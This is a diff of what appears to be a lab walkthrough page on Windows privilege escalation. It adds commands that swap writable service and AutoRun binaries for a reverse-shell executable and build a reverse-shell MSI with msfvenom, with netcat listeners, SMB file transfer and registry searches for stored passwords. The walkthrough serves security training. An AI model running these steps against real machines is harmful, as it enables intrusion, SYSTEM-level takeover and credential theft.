@@ -19,7 +19,7 @@ On Kali, in the same directory as reverse.exe:
 **Kali**
 
 ```
-sudo python3 /opt/impacket/build/scripts-3.9/smbserver.py kali . 
+sudo python3.9 /opt/impacket/build/scripts-3.9/smbserver.py kali . 
 ```
 
 On Windows (update the IP address with your Kali IP):
@@ -206,59 +206,75 @@ net start regsvc
 
 Query the "filepermsvc" service and note that it runs with SYSTEM privileges (SERVICE\_START\_NAME).
 
-
+**Victim**
 
 ```
 sc qc filepermsvc
 ```
 
+<figure><img src="../../.gitbook/assets/image (1217).png" alt=""><figcaption></figcaption></figure>
+
 Using accesschk.exe, note that the service binary (BINARY\_PATH\_NAME) file is writable by everyone:
 
-
+**Victim**
 
 ```
 C:\PrivEsc\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
 ```
 
+<figure><img src="../../.gitbook/assets/image (1219).png" alt=""><figcaption></figcaption></figure>
+
 Copy the reverse.exe executable you created and replace the filepermservice.exe with it:
 
-
+**Victim**
 
 ```
 copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y
 ```
 
+<figure><img src="../../.gitbook/assets/image (1218).png" alt=""><figcaption></figcaption></figure>
+
 Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges:
 
+**Kali**
 
+```
+rlwrap nc -nvlp 54 
+```
+
+**Victim**
 
 ```
 net start filepermsvc
 ```
 
-
+<figure><img src="../../.gitbook/assets/image (1220).png" alt=""><figcaption></figcaption></figure>
 
 ## Registry - AutoRuns
 
 Query the registry for AutoRun executables:
 
-
+**Victim**
 
 ```
 reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
 ```
 
+<figure><img src="../../.gitbook/assets/image (1221).png" alt=""><figcaption></figcaption></figure>
+
 Using accesschk.exe, note that one of the AutoRun executables is writable by everyone:
 
-
+**Victim**
 
 ```
 C:\PrivEsc\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"
 ```
 
+<figure><img src="../../.gitbook/assets/image (1222).png" alt=""><figcaption></figcaption></figure>
+
 Copy the reverse.exe executable you created and overwrite the AutoRun executable with it:
 
-
+**Victim**
 
 ```
 copy C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y
@@ -266,44 +282,72 @@ copy C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y
 
 Start a listener on Kali and then restart the Windows VM. Open up a new RDP session to trigger a reverse shell running with admin privileges. You should not have to authenticate to trigger it, however if the payload does not fire, log in as an admin (admin/password123) to trigger it. Note that in a real world engagement, you would have to wait for an administrator to log in themselves!
 
-
+**Kali**
 
 ```
-rdesktop MACHINE_IP
+rlwrap nc -nvlp 54 
 ```
 
+**Kali**
 
+```
+xfreerdp /u:admin /p:password123 /cert:ignore /v:$VICTIM
+```
+
+<figure><img src="../../.gitbook/assets/image (1223).png" alt=""><figcaption></figcaption></figure>
 
 ## Registry - AlwaysInstallElevated
 
 Query the registry for AlwaysInstallElevated keys:
 
-
+**Victim**
 
 ```
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 ```
 
+<figure><img src="../../.gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>
+
 Note that both keys are set to 1 (0x1).
 
 On Kali, generate a reverse shell Windows Installer (reverse.msi) using msfvenom. Update the LHOST IP address accordingly:\
-
+**Kali**
 
 ```
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f msi -o reverse.msi
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KALI LPORT=54 -f msi -o reverse.msi
 ```
 
 Transfer the reverse.msi file to the C:\PrivEsc directory on Windows (use the SMB server method from earlier).
 
+**Kali**
+
+```
+sudo python3.9 /opt/impacket/build/scripts-3.9/smbserver.py kali . 
+```
+
+**Victim**
+
+```
+copy \\$KALI\kali\reverse.msi C:\PrivEsc\reverse.msi
+```
+
 Start a listener on Kali and then run the installer to trigger a reverse shell running with SYSTEM privileges:\
 
 
+**Kali**
 
+```
+rlwrap nc -nvlp 54
+```
+
+**Victim**
 
 ```
 msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
 ```
+
+<figure><img src="../../.gitbook/assets/image (1225).png" alt=""><figcaption></figcaption></figure>
 
 ## Passwords - Registry
 
@@ -312,7 +356,7 @@ msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
 
 The registry can be searched for keys and values that contain the word "password":
 
-
+**Victim**
 
 ```
 reg query HKLM /f password /t REG_SZ /s
@@ -320,7 +364,7 @@ reg query HKLM /f password /t REG_SZ /s
 
 If you want to save some time, query this specific key to find admin AutoLogon credentials:
 
-
+**Victim**
 
 ```
 reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
@@ -328,10 +372,10 @@ reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
 
 On Kali, use the winexe command to spawn a command prompt running with the admin privileges (update the password with the one you found):
 
-
+**Kali**
 
 ```
-winexe -U 'admin%password' //MACHINE_IP cmd.exe
+winexe -U 'admin%password' //$VICTIM cmd.exe
 ```
 
 ## Passwords - Saved Creds
